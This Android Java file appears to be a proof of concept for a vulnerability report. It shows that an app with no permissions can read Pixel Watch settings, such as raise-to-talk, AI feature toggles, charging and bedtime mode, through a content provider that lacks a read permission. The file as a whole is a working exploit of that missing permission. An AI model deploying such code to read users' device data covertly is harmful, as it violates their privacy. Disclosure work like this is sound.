package com.vrp.poc;

import android.app.Activity;
import android.content.ContentResolver;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

public class PixelWatchSettingsLeakActivity extends Activity {
    private static final String TAG = "VRP_PWSP";
    private static final String AUTHORITY = "com.google.android.wearable.pixel.settings";

    private static final String[][] SETTINGS = {
        {"1001", "raise_to_talk", "boolean"},
        {"1002", "raise_to_talk_mediated", "boolean"},
        {"1003", "raise_to_talk_supported", "boolean"},
        {"1004", "raise_to_talk_gemini_enabled", "boolean"},
        {"1006", "raise_to_talk_sensitivity", "int"},
        {"1007", "raise_to_talk_indicator", "boolean"},
        {"1008", "raise_to_talk_triggered", "boolean"},
        {"2001", "adaptive_charging", "boolean"},
        {"3001", "smart_reply_ai_enabled", "boolean"},
        {"4004", "auto_bedtime_mode_supported", "boolean"},
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(9f);
        sv.addView(tv);
        setContentView(sv);

        new Thread(() -> {
            StringBuilder sb = new StringBuilder();
            sb.append("=== VRP #46: PixelWatch Settings Provider Zero-Perm Leak ===\n");
            sb.append("PoC UID: ").append(android.os.Process.myUid()).append("\n");
            sb.append("PID: ").append(android.os.Process.myPid()).append("\n\n");

            sb.append("--- PixelWatchSettingsProvider (zero-perm read) ---\n");
            sb.append("Provider: content://").append(AUTHORITY).append("\n");
            sb.append("writePermission: android.permission.WRITE_SECURE_SETTINGS\n");
            sb.append("readPermission: NONE (missing!)\n\n");

            ContentResolver cr = getContentResolver();
            int readCount = 0;

            for (String[] setting : SETTINGS) {
                String id = setting[0];
                String name = setting[1];
                String type = setting[2];
                try {
                    Bundle result = cr.call(
                        android.net.Uri.parse("content://" + AUTHORITY),
                        "get", id, null);
                    if (result != null) {
                        if (result.containsKey("value")) {
                            int value = result.getInt("value");
                            String display;
                            if (type.equals("boolean")) {
                                display = value == 1 ? "ENABLED" : (value == 0 ? "DISABLED" : "value=" + value);
                            } else {
                                display = "value=" + value;
                            }
                            sb.append("  ").append(name).append(" [").append(id).append("]: ").append(display).append("\n");
                            Log.i(TAG, "SETTING: " + name + " [" + id + "] = " + display);
                            readCount++;
                        } else {
                            sb.append("  ").append(name).append(" [").append(id).append("]: NOT SET\n");
                            Log.i(TAG, "SETTING: " + name + " [" + id + "] = NOT SET");
                            readCount++;
                        }
                    } else {
                        sb.append("  ").append(name).append(" [").append(id).append("]: null result\n");
                    }
                } catch (Exception e) {
                    sb.append("  ").append(name).append(" [").append(id).append("]: ERROR ").append(e.getMessage()).append("\n");
                    Log.e(TAG, "Error reading " + name, e);
                }
            }

            sb.append("\n--- SUMMARY ---\n");
            sb.append("Settings read: ").append(readCount).append("/").append(SETTINGS.length).append("\n");
            sb.append("Provider runs as UID 1000 (system)\n");
            sb.append("No readPermission declared in manifest\n");
            sb.append("writePermission = WRITE_SECURE_SETTINGS (system only)\n");
            sb.append("IMPACT: Zero-permission app reads AI/ML feature status,\n");
            sb.append("  charging preferences, bedtime mode config\n");

            final String result = sb.toString();
            Log.i(TAG, result);
            runOnUiThread(() -> tv.setText(result));
        }).start();
    }
}
